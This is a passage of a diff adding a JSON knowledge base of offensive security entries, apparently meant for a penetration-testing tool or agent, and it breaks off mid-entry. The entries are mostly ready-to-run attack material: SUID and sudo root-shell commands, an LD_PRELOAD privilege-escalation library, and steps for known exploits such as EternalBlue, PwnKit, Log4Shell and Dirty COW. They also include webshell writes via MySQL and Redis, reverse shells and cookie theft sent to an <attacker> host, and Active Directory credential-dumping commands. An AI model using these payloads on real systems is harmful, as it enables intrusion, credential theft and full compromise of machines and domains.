@@ -1,0 +1,1047 @@
+[
+  {
+    "id": "gtfobins-bash-suid",
+    "content": "GTFOBins: bash with SUID bit\nCondition: find / -perm -4000 -name bash 2>/dev/null returns a result\nCommand: bash -p\nResult: Effective UID becomes root. -p disables automatic privilege dropping.\nAlso works with: /bin/sh -p if sh has SUID",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "gtfobins-python3-suid",
+    "content": "GTFOBins: python3 with SUID bit\nCondition: find / -perm -4000 -name python* 2>/dev/null returns a result\nCommand: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nAlso works for python2: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "python3"
+    }
+  },
+  {
+    "id": "gtfobins-perl-suid",
+    "content": "GTFOBins: perl with SUID bit\nCondition: find / -perm -4000 -name perl 2>/dev/null\nCommand: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "perl"
+    }
+  },
+  {
+    "id": "gtfobins-ruby-suid",
+    "content": "GTFOBins: ruby with SUID bit\nCondition: find / -perm -4000 -name ruby 2>/dev/null\nCommand: ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "ruby"
+    }
+  },
+  {
+    "id": "gtfobins-find-suid",
+    "content": "GTFOBins: find with SUID bit\nCondition: find / -perm -4000 -name find 2>/dev/null\nCommand: find . -exec /bin/bash -p \\; -quit\nResult: Root shell via -exec flag",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "find"
+    }
+  },
+  {
+    "id": "gtfobins-vim-suid",
+    "content": "GTFOBins: vim with SUID bit\nCondition: find / -perm -4000 -name vim 2>/dev/null\nCommand: vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'\nAlternative: vim -c ':!/bin/bash -p'\nResult: Root shell or root file read",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "vim"
+    }
+  },
+  {
+    "id": "gtfobins-nmap-suid",
+    "content": "GTFOBins: nmap with SUID bit (old nmap with --interactive)\nCondition: find / -perm -4000 -name nmap 2>/dev/null; nmap version < 5.21\nCommand: nmap --interactive\nThen at nmap> prompt: !sh\nResult: Root shell. Newer nmap does not have --interactive.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "gtfobins-awk-suid",
+    "content": "GTFOBins: awk with SUID bit\nCondition: find / -perm -4000 -name awk 2>/dev/null\nCommand: awk 'BEGIN {system(\"/bin/bash -p\")}'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "awk"
+    }
+  },
+  {
+    "id": "gtfobins-env-suid",
+    "content": "GTFOBins: env with SUID bit\nCondition: find / -perm -4000 -name env 2>/dev/null\nCommand: env /bin/bash -p\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "env"
+    }
+  },
+  {
+    "id": "gtfobins-less-suid",
+    "content": "GTFOBins: less / more with SUID bit\nCondition: find / -perm -4000 \\( -name less -o -name more \\) 2>/dev/null\nCommand: less /etc/passwd\nThen at the less prompt type: !/bin/bash -p\nResult: Root shell via shell escape",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "less"
+    }
+  },
+  {
+    "id": "gtfobins-tee-suid",
+    "content": "GTFOBins: tee with SUID bit (file write)\nCondition: find / -perm -4000 -name tee 2>/dev/null\nUse for arbitrary file write as root:\n  echo 'root2:x:0:0::/root:/bin/bash' | tee -a /etc/passwd\n  echo 'user ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers\nResult: Write arbitrary files as root; add new root user or sudo entry",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "tee"
+    }
+  },
+  {
+    "id": "gtfobins-cp-suid",
+    "content": "GTFOBins: cp with SUID bit (file copy as root)\nCondition: find / -perm -4000 -name cp 2>/dev/null\nRead /etc/shadow: cp /etc/shadow /tmp/shadow && cat /tmp/shadow\nOverwrite /etc/passwd: cp /tmp/mypasswd /etc/passwd\nResult: Arbitrary file read/write as root",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "cp"
+    }
+  },
+  {
+    "id": "gtfobins-cat-suid",
+    "content": "GTFOBins: cat with SUID bit (file read)\nCondition: find / -perm -4000 -name cat 2>/dev/null\nCommand: cat /etc/shadow\ncat /root/root.txt  (flag read)\ncat /root/.ssh/id_rsa  (key exfil)\nResult: Arbitrary file read as root",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "cat"
+    }
+  },
+  {
+    "id": "gtfobins-nano-suid",
+    "content": "GTFOBins: nano with SUID bit\nCondition: find / -perm -4000 -name nano 2>/dev/null\nRead shadow: nano /etc/shadow\nAdd root user: nano /etc/passwd \u2192 append: evil:x:0:0::/root:/bin/bash\nShell escape: Ctrl+R then Ctrl+X \u2192 enter command\nResult: File read/write or command execution as root",
+    "metadata": {
+      "category": "privesc",
+      "technique": "suid",
+      "tool": "nano"
+    }
+  },
+  {
+    "id": "gtfobins-capabilities",
+    "content": "Linux capabilities escalation\nDetection: getcap -r / 2>/dev/null\nDangerous capabilities:\n  cap_setuid+ep on python3: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n  cap_setuid+ep on perl: perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\"'\n  cap_net_raw: can sniff network traffic\n  cap_dac_override: bypass file permissions\n  cap_sys_admin: mount filesystems, can lead to container escape",
+    "metadata": {
+      "category": "privesc",
+      "technique": "capabilities",
+      "tool": "getcap"
+    }
+  },
+  {
+    "id": "sudo-bash",
+    "content": "GTFOBins: bash via sudo\nCondition: sudo -l shows (root) NOPASSWD: /bin/bash\nCommand: sudo bash\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "sudo-python3",
+    "content": "GTFOBins: python3 via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/python3\nCommand: sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "python3"
+    }
+  },
+  {
+    "id": "sudo-find",
+    "content": "GTFOBins: find via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/find\nCommand: sudo find / -exec /bin/bash \\; -quit\nResult: Root shell via exec",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "find"
+    }
+  },
+  {
+    "id": "sudo-vim",
+    "content": "GTFOBins: vim via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/vim\nCommand: sudo vim -c ':!/bin/bash'\nAlternative: sudo vim /etc/sudoers (edit directly)\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "vim"
+    }
+  },
+  {
+    "id": "sudo-less",
+    "content": "GTFOBins: less via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/less\nCommand: sudo less /etc/passwd\nAt prompt type: !/bin/bash\nResult: Root shell via shell escape",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "less"
+    }
+  },
+  {
+    "id": "sudo-awk",
+    "content": "GTFOBins: awk via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/awk\nCommand: sudo awk 'BEGIN {system(\"/bin/bash\")}'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "awk"
+    }
+  },
+  {
+    "id": "sudo-nmap",
+    "content": "GTFOBins: nmap via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/nmap\nOld nmap (<5.21): sudo nmap --interactive \u2192 !sh\nNew nmap: echo 'os.execute(\"/bin/bash\")' > /tmp/nmap.nse && sudo nmap --script /tmp/nmap.nse\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "sudo-tee",
+    "content": "GTFOBins: tee via sudo (file write)\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/tee\nAdd to sudoers: echo 'currentuser ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers\nThen: sudo bash\nResult: Full sudo without password",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "tee"
+    }
+  },
+  {
+    "id": "sudo-perl",
+    "content": "GTFOBins: perl via sudo\nCondition: sudo -l shows (root) NOPASSWD: /usr/bin/perl\nCommand: sudo perl -e 'exec \"/bin/bash\"'\nResult: Root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "perl"
+    }
+  },
+  {
+    "id": "sudo-env-ld-preload",
+    "content": "sudo env LD_PRELOAD privilege escalation\nCondition: sudo -l shows env_keep+=LD_PRELOAD AND any sudo command allowed\nSteps:\n  1. Create /tmp/pe.c:\n     #include<stdio.h>\\n#include<unistd.h>\\nvoid _init(){setuid(0);setgid(0);system(\"/bin/bash\");}\n  2. gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c\n  3. sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>\nResult: Root shell via shared library injection",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sudo",
+      "tool": "ld_preload"
+    }
+  },
+  {
+    "id": "default-creds-ftp",
+    "content": "Default credentials: FTP\nAlways try anonymous FTP first:\n  ftp <host>  \u2192  username: anonymous  \u2192  password: anything@email.com\nCommon defaults: admin:admin, admin:password, ftp:ftp, root:root\nCheck for anonymous with: nmap -sV --script ftp-anon -p 21 <host>\nList files: ls -la; get files: get <filename>",
+    "metadata": {
+      "category": "default-creds",
+      "service": "ftp",
+      "port": "21"
+    }
+  },
+  {
+    "id": "default-creds-ssh",
+    "content": "Default credentials: SSH\nCommon defaults: root:root, root:toor, admin:admin, pi:raspberry (Raspberry Pi)\nubuntu:ubuntu (AWS Ubuntu AMIs), vagrant:vagrant (Vagrant VMs)\nBrute force (requires approval): hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<host>\nKey-based: check /home/*/.ssh/authorized_keys for hints on valid users\nAlso check /etc/ssh/sshd_config for PermitRootLogin and PasswordAuthentication",
+    "metadata": {
+      "category": "default-creds",
+      "service": "ssh",
+      "port": "22"
+    }
+  },
+  {
+    "id": "default-creds-mysql",
+    "content": "Default credentials: MySQL / MariaDB\nCommon defaults: root: (blank password), root:root, root:mysql\nConnect: mysql -h <host> -u root -p\nList databases: SHOW DATABASES;\nRead files (if FILE privilege): SELECT LOAD_FILE('/etc/passwd');\nWrite files: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\nNmap check: nmap --script mysql-empty-password -p 3306 <host>",
+    "metadata": {
+      "category": "default-creds",
+      "service": "mysql",
+      "port": "3306"
+    }
+  },
+  {
+    "id": "default-creds-mssql",
+    "content": "Default credentials: MSSQL (Microsoft SQL Server)\nCommon defaults: sa: (blank), sa:sa, sa:password\nConnect: mssqlclient.py <domain>/<user>:<pass>@<host>\nEnable xp_cmdshell: EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n           EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nRun OS command: EXEC xp_cmdshell 'whoami';\nNmap: nmap --script ms-sql-empty-password -p 1433 <host>",
+    "metadata": {
+      "category": "default-creds",
+      "service": "mssql",
+      "port": "1433"
+    }
+  },
+  {
+    "id": "default-creds-postgres",
+    "content": "Default credentials: PostgreSQL\nCommon defaults: postgres:postgres, postgres: (blank)\nConnect: psql -h <host> -U postgres\nList databases: \\l\nExecute OS commands (if superuser): COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\nRead file: COPY /etc/passwd TO STDOUT;\nNmap: nmap --script pgsql-brute -p 5432 <host>",
+    "metadata": {
+      "category": "default-creds",
+      "service": "postgresql",
+      "port": "5432"
+    }
+  },
+  {
+    "id": "default-creds-redis",
+    "content": "Default credentials: Redis\nOften unauthenticated with no password required\nConnect: redis-cli -h <host>\nCheck auth: AUTH password (try common passwords or blank)\nDump keys: KEYS *  \u2192  GET <key>\nWrite files: CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php;\n             SET payload '<?php system($_GET[\"cmd\"]); ?>';\n             SAVE;\nWrite SSH key: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys;\n               SET mykey '<your_public_key>'; SAVE;",
+    "metadata": {
+      "category": "default-creds",
+      "service": "redis",
+      "port": "6379"
+    }
+  },
+  {
+    "id": "default-creds-mongodb",
+    "content": "Default credentials: MongoDB\nOften runs unauthenticated on port 27017\nConnect: mongosh <host>:27017  or  mongo <host>:27017\nList DBs: show dbs\nDump collection: use <db>; db.users.find()\nCheck for credentials in collections \u2014 often stores plaintext passwords",
+    "metadata": {
+      "category": "default-creds",
+      "service": "mongodb",
+      "port": "27017"
+    }
+  },
+  {
+    "id": "default-creds-snmp",
+    "content": "Default credentials: SNMP\nCommon community strings: public, private, community, manager\nEnumerate (v1/v2c): snmpwalk -v2c -c public <host>\nEnumerate users: snmpwalk -v1 -c public <host> 1.3.6.1.4.1.77.1.2.25\nEnumerate network: snmpwalk -v1 -c public <host> 1.3.6.1.2.1.4.34\nBrute community strings: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <host>",
+    "metadata": {
+      "category": "default-creds",
+      "service": "snmp",
+      "port": "161"
+    }
+  },
+  {
+    "id": "default-creds-smb",
+    "content": "Default credentials: SMB / Windows\nTry null sessions: smbclient -N -L //<host>/\nGuest access: smbclient -U guest -N //<host>/\nCommon defaults: Administrator: (blank), admin:admin, guest: (blank)\nEnumerate shares: crackmapexec smb <host> -u '' -p ''\nCheck for guest: crackmapexec smb <host> -u 'guest' -p ''",
+    "metadata": {
+      "category": "default-creds",
+      "service": "smb",
+      "port": "445"
+    }
+  },
+  {
+    "id": "default-creds-web-admin",
+    "content": "Default credentials: Common web admin panels\nWordPress: admin:admin, admin:password \u2014 login at /wp-admin\nDrupal: admin:admin \u2014 login at /user/login\nJoomla: admin:admin \u2014 login at /administrator\nTomcat: admin:admin, tomcat:tomcat, manager:manager \u2014 at /manager/html\nJenkins: admin:admin, admin: (blank) \u2014 at /login\nGrafana: admin:admin \u2014 at /login\nphpMyAdmin: root: (blank), root:root \u2014 at /phpmyadmin\nWebmin: admin:admin \u2014 at port 10000",
+    "metadata": {
+      "category": "default-creds",
+      "service": "web",
+      "port": "80,443,8080"
+    }
+  },
+  {
+    "id": "cve-vsftpd-234",
+    "content": "CVE: vsftpd 2.3.4 backdoor\nAffected: vsftpd 2.3.4 on port 21\nDetection: nmap -sV on port 21 shows 'vsftpd 2.3.4'\nHow it works: Logging in with a username containing ':)' triggers a backdoor shell on port 6200\nExploit:\n  nc <host> 21  \u2192  USER \":)\"  \u2192  PASS anything  \u2192  nc <host> 6200\nMetasploit: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <host>; run\nResult: Root shell on port 6200",
+    "metadata": {
+      "category": "cve",
+      "cve": "N/A",
+      "service": "ftp",
+      "port": "21"
+    }
+  },
+  {
+    "id": "cve-ms17-010-eternalblue",
+    "content": "CVE: MS17-010 EternalBlue (SMBv1 RCE)\nAffected: Windows 7, Server 2008, unpatched Windows 10 \u2014 SMBv1 on port 445\nDetection: nmap --script smb-vuln-ms17-010 -p 445 <host>\nMetasploit:\n  use exploit/windows/smb/ms17_010_eternalblue\n  set RHOSTS <host>; set LHOST <attacker>; set PAYLOAD windows/x64/meterpreter/reverse_tcp\n  run\nResult: SYSTEM shell. No credentials needed.\nNote: Often detected by AV \u2014 try ms17_010_psexec module as alternative",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2017-0144",
+      "service": "smb",
+      "port": "445"
+    }
+  },
+  {
+    "id": "cve-2021-4034-pwnkit",
+    "content": "CVE: CVE-2021-4034 PwnKit (polkit pkexec LPE)\nAffected: All Linux distros with polkit < 0.120 (before Jan 2022 patches)\nDetection: pkexec --version; dpkg -l policykit-1 (check version)\nExploit:\n  git clone https://github.com/ly4k/PwnKit; cd PwnKit; make; ./PwnKit\n  OR: curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit; chmod +x PwnKit; ./PwnKit\nResult: Instant root shell on vulnerable systems\nNote: Widely patched \u2014 check kernel/package versions first",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2021-4034",
+      "service": "local",
+      "port": "N/A"
+    }
+  },
+  {
+    "id": "cve-2014-6271-shellshock",
+    "content": "CVE: CVE-2014-6271 Shellshock (bash RCE)\nAffected: bash < 4.3 patch 25 \u2014 CGI scripts, DHCP clients, SSH ForceCommand\nTest: curl -H 'User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/id' http://<host>/cgi-bin/test.cgi\nExploit headers to try: User-Agent, Referer, Cookie, X-Forwarded-For\nMetasploit: use exploit/multi/http/apache_mod_cgi_bash_env_exec\nReverse shell payload: () { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2014-6271",
+      "service": "bash/cgi",
+      "port": "80"
+    }
+  },
+  {
+    "id": "cve-2021-44228-log4shell",
+    "content": "CVE: CVE-2021-44228 Log4Shell (Log4j RCE)\nAffected: Apache Log4j 2.0-beta9 to 2.14.1 (Java applications)\nDetection: Any Java app accepting user input logged via Log4j\nPayload: ${jndi:ldap://<attacker>:389/a}\nInject in: URL parameters, headers (User-Agent, X-Forwarded-For, Authorization), form fields\nTest: ${jndi:ldap://<your_burp_collaborator>/test} \u2014 check for DNS callback\nTool: java -jar JNDI-Exploit-Kit.jar (setup LDAP server + payload)\nResult: RCE as the user running the Java application",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2021-44228",
+      "service": "java",
+      "port": "80,443,8080"
+    }
+  },
+  {
+    "id": "cve-2021-3156-baron-samedit",
+    "content": "CVE: CVE-2021-3156 Baron Samedit (sudo heap overflow LPE)\nAffected: sudo < 1.9.5p2 \u2014 check with: sudoedit -s /\nIf vulnerable: prints 'usage: sudoedit' (not a syntax error)\nExploit: https://github.com/blasty/CVE-2021-3156\n  git clone https://github.com/blasty/CVE-2021-3156; cd CVE-2021-3156; make\n  ./sudo-hax-me-a-sandwich 0  (try different targets: 0, 1, 2)\nResult: Root shell without knowing any password",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2021-3156",
+      "service": "local",
+      "port": "N/A"
+    }
+  },
+  {
+    "id": "cve-2016-5195-dirtycow",
+    "content": "CVE: CVE-2016-5195 Dirty COW (kernel race condition LPE)\nAffected: Linux kernel < 4.8.3 (many older systems, containers)\nDetection: uname -r \u2014 if < 4.8.3, potentially vulnerable\nExploit variants:\n  dirtyc0w.c \u2014 overwrites /proc/self/mem to patch /etc/passwd\n  cowroot.c \u2014 creates SUID root shell\nDownload: https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c\nCompile: gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt\nResult: Local privilege escalation to root",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2016-5195",
+      "service": "local",
+      "port": "N/A"
+    }
+  },
+  {
+    "id": "cve-2014-0160-heartbleed",
+    "content": "CVE: CVE-2014-0160 OpenSSL Heartbleed (memory disclosure)\nAffected: OpenSSL 1.0.1 through 1.0.1f\nDetection: nmap --script ssl-heartbleed -p 443 <host>\nManual test: python heartbleed.py <host> 443\nMetasploit: use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS <host>; run\nLeaks: session tokens, private keys, passwords, user data from server memory\nResult: Information disclosure \u2014 may reveal credentials or session tokens",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2014-0160",
+      "service": "ssl/tls",
+      "port": "443"
+    }
+  },
+  {
+    "id": "cve-2015-3306-proftpd",
+    "content": "CVE: CVE-2015-3306 ProFTPd mod_copy (unauthenticated file copy)\nAffected: ProFTPd 1.3.5 with mod_copy enabled\nDetection: nmap -sV port 21 shows 'ProFTPD 1.3.5'\nExploit: SITE CPFR and SITE CPTO commands work without authentication\n  nc <host> 21\n  SITE CPFR /etc/passwd\n  SITE CPTO /var/www/html/passwd.txt\n  curl http://<host>/passwd.txt\nWrite webshell: SITE CPFR /proc/self/cmdline; SITE CPTO /var/www/html/shell.php\nMetasploit: use exploit/unix/ftp/proftpd_modcopy_exec",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2015-3306",
+      "service": "ftp",
+      "port": "21"
+    }
+  },
+  {
+    "id": "cve-2021-1675-printnightmare",
+    "content": "CVE: CVE-2021-1675 PrintNightmare (Windows Print Spooler RCE/LPE)\nAffected: Windows with Print Spooler service (default ON)\nDetection: rpcdump.py @<host> | findstr 'MS-RPRN'\nRemote exploit (LPE \u2192 SYSTEM):\n  python3 CVE-2021-1675.py <domain>/<user>:<pass>@<host> '\\\\<attacker>\\share\\shell.dll'\nLocal exploit: SpoolFool or PrintNightmare.exe\nMetasploit: use exploit/windows/dcerpc/cve_2021_1675_printnightmare\nResult: SYSTEM or local privilege escalation",
+    "metadata": {
+      "category": "cve",
+      "cve": "CVE-2021-1675",
+      "service": "spooler",
+      "port": "445"
+    }
+  },
+  {
+    "id": "web-sqli-auth-bypass",
+    "content": "SQL Injection: authentication bypass payloads\nBasic: ' OR '1'='1  /  ' OR 1=1 --  /  ' OR 'x'='x\nComment styles: --  /*  #  (use # for MySQL)\nAlways-true: 1'OR'1'='1  /  admin'--  /  ' OR 1=1#\nUnion-based test: ' UNION SELECT 1,2,3--\nError-based (MySQL): ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--\nTime-based blind (MySQL): ' AND SLEEP(5)--\nTime-based blind (MSSQL): '; WAITFOR DELAY '0:0:5'--\nUse sqlmap for automation: sqlmap -u '<url>' --forms --dbs (requires approval)",
+    "metadata": {
+      "category": "web",
+      "technique": "sqli",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-lfi-paths",
+    "content": "Local File Inclusion (LFI): common paths to try\nLinux files: /etc/passwd  /etc/shadow  /etc/hosts  /proc/self/environ\n              /var/log/apache2/access.log  /var/log/auth.log\nPath traversal: ../../../etc/passwd  /....//....//etc/passwd\nPHP wrappers: php://filter/convert.base64-encode/resource=index.php\n              php://input (for RCE via POST)\n              data://text/plain;base64,<base64_payload>\nNull byte bypass (PHP < 5.3): ../../../../etc/passwd%00\nLog poisoning: poison User-Agent in access.log, then include log file",
+    "metadata": {
+      "category": "web",
+      "technique": "lfi",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-file-upload-bypass",
+    "content": "File upload bypass techniques\nChange extension: .php \u2192 .php5, .phtml, .pHp, .php.jpg\nMagic bytes: add GIF89a; to start of PHP file, name it shell.php.gif\nContent-Type bypass: change MIME type to image/jpeg in Burp while keeping .php extension\nNull byte: shell.php%00.jpg\nDouble extension: shell.jpg.php\nhtaccess trick: upload .htaccess with 'AddType application/x-httpd-php .jpg'\nEXIF injection: embed PHP in EXIF comment field, upload as real .jpg\nAfter upload: check /uploads/, /files/, /images/ for the shell",
+    "metadata": {
+      "category": "web",
+      "technique": "file-upload",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-xss-payloads",
+    "content": "Cross-Site Scripting (XSS): basic test payloads\nBasic: <script>alert(1)</script>\nAttribute injection: \" onmouseover=\"alert(1)\nJS event: <img src=x onerror=alert(1)>\nSVG: <svg onload=alert(1)>\nFilter bypass: <ScRiPt>alert(1)</ScRiPt>  /  <img/src=x onerror=alert(1)>\nCookie steal: <script>fetch('http://<attacker>/?c='+document.cookie)</script>\nDOM XSS: look for location.hash, document.write, innerHTML in JS source\nTool: dalfox url '<url>' (requires approval)",
+    "metadata": {
+      "category": "web",
+      "technique": "xss",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-command-injection",
+    "content": "OS Command Injection: test payloads\nSeparator chars: ;  &&  ||  |  `  $(...)\nBasic test: ; id  && id  | id  `id`  $(id)\nBlind (time-based): ; sleep 5\nOut-of-band: ; curl http://<attacker>:8080/$(id)\nReverse shell: ; bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'\nURL encoded: %3B+id  %26%26+id\nLook for: ping, host lookup, DNS queries, file conversion, report generation fields",
+    "metadata": {
+      "category": "web",
+      "technique": "cmdi",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-ssrf-payloads",
+    "content": "Server-Side Request Forgery (SSRF): test payloads\nTarget internal services: http://127.0.0.1/<path>  http://localhost/\nCloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)\n               http://169.254.169.254/computeMetadata/v1/ (GCP, add header)\n               http://169.254.169.254/metadata/instance (Azure)\nBypass filters: http://0.0.0.0/  http://2130706433/ (decimal 127.0.0.1)\n               http://127.1/  http://[::1]/  http://spoofed.domain@127.0.0.1/\nProtocol escalation: dict://  gopher://  file:///etc/passwd\nInternal port scan: test http://127.0.0.1:<port>/ for each port",
+    "metadata": {
+      "category": "web",
+      "technique": "ssrf",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-idor-access-control",
+    "content": "Insecure Direct Object Reference (IDOR) and broken access control\nTest: change numeric IDs in URLs, API calls, form params: ?id=1 \u2192 ?id=2\nTry: other user IDs, negative IDs, zero, GUIDs from other responses\nHorizontal escalation: access another user's data with same privilege\nVertical escalation: access admin endpoints as regular user\nTest admin endpoints: /admin, /api/admin/, /management, /console\nRole bypass: change role in JWT, cookie, request param, or hidden form field\nHTTP method bypass: try GET vs POST vs PUT vs DELETE on restricted endpoints\nHeader bypass: X-Original-URL: /admin  X-Rewrite-URL: /admin  X-Custom-IP-Authorization: 127.0.0.1",
+    "metadata": {
+      "category": "web",
+      "technique": "idor",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-directory-traversal",
+    "content": "Directory traversal and content discovery\nCommon wordlists in container:\n  /usr/share/seclists/Discovery/Web-Content/common.txt\n  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n  /usr/share/wordlists/dirb/common.txt\nffuf: ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<host>/FUZZ\nferoxbuster: feroxbuster -u http://<host>/ -w <wordlist> --depth 2\ngobuster: gobuster dir -u http://<host>/ -w <wordlist> -x php,html,txt\nAPI endpoints: /api/v1/, /api/v2/, /swagger.json, /api-docs, /.well-known/\nBackup files: .bak, .old, .orig, ~, .swp",
+    "metadata": {
+      "category": "web",
+      "technique": "discovery",
+      "tool": "ffuf"
+    }
+  },
+  {
+    "id": "ad-asreproasting",
+    "content": "Active Directory: AS-REP Roasting\nCondition: User has 'Do not require Kerberos preauthentication' enabled (UF_DONT_REQUIRE_PREAUTH)\nNo credentials needed \u2014 only usernames\nEnumerate vulnerable users:\n  GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat\nWith credentials:\n  GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <dc_ip> -format hashcat\nCrack offline:\n  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\nResult: Domain user credentials if hash cracks",
+    "metadata": {
+      "category": "ad",
+      "technique": "asreproasting",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "ad-kerberoasting",
+    "content": "Active Directory: Kerberoasting\nCondition: Any valid domain user + service account with SPN set\nRequest TGS tickets:\n  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile spn_hashes.txt\nCrack offline:\n  hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt\nEnumerate SPNs only (no ticket):\n  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip>\nResult: Service account credentials if hash cracks\nNote: Service accounts often have high privileges (Domain Admin) and weak passwords",
+    "metadata": {
+      "category": "ad",
+      "technique": "kerberoasting",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "ad-pass-the-hash",
+    "content": "Active Directory: Pass-the-Hash\nCondition: Have an NTLM hash (from secretsdump, mimikatz, etc.)\nWMI exec: wmiexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>\nPSExec: psexec.py <domain>/<user>@<host> -hashes :<ntlm_hash>\nSMB: smbclient.py <domain>/<user>@<host> -hashes :<ntlm_hash>\nCrackMapExec: crackmapexec smb <host> -u <user> -H <ntlm_hash>\nEvil-WinRM: evil-winrm -i <host> -u <user> -H <ntlm_hash>\nNote: Works with NT hash only (second half of NTLM: aad3b...:ntlm_here)",
+    "metadata": {
+      "category": "ad",
+      "technique": "pass-the-hash",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "ad-dcsync",
+    "content": "Active Directory: DCSync attack\nCondition: Account has Replicating Directory Changes + Replicating Directory Changes All rights\n           (or is in Domain Admins / Enterprise Admins)\nDump all hashes:\n  secretsdump.py <domain>/<user>:<pass>@<dc_ip>\nDump specific account:\n  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user Administrator\nDump krbtgt (for Golden Ticket):\n  secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt\nResult: All domain NTLM hashes \u2192 full domain compromise",
+    "metadata": {
+      "category": "ad",
+      "technique": "dcsync",
+      "tool": "secretsdump"
+    }
+  },
+  {
